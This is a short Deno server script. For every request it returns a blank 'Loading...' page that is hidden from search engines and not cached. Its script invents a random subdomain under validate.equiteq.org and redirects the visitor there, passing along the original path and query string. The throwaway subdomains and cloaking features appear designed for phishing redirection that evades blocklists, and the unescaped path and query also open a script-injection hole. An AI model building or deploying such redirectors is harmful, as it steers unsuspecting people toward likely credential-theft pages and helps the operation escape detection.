Deno.serve({ port: 8080 }, (request: Request): Response => {
  try {
    const url = new URL(request.url);
    const currentPath = url.pathname;
    const queryString = url.search;

    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="robots" content="noindex, nofollow">
  <title>Loading...</title>
</head>
<body>
  <noscript>Please enable JavaScript to continue.</noscript>
  <script>
    (function() {
      var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
      var sub = '';
      for (var i = 0; i < 5; i++) {
        sub += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      var dest = 'https://details' + sub + '.validate.equiteq.org${currentPath}?q=a${queryString ? '&' + queryString.substring(1) : ''}';
      window.location.replace(dest);
    })();
  </script>
</body>
</html>`;

    return new Response(html, {
      status: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store, no-cache, must-revalidate'
      }
    });

  } catch (error) {
    console.error("Error:", error);
    return new Response("Internal Server Error", { status: 500 });
  }
});
